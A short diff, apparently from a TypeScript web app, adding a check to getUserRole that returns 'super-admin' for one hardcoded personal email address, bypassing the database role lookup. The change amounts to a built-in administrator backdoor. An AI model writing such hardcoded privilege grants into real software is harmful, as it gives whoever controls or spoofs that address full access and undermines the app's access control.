@@ -332,6 +332,10 @@ const OWNER_COLLECTIONS = new Set([
 // ==========================
 
 async function getUserRole(uid: string, email?: string, existingRole?: string): Promise<UserRole | null> {
+  if (email === 'landrymoutongo97@gmail.com') {
+    return 'super-admin';
+  }
+
   const currentDb = getDb();
   if (!currentDb) return null;
 
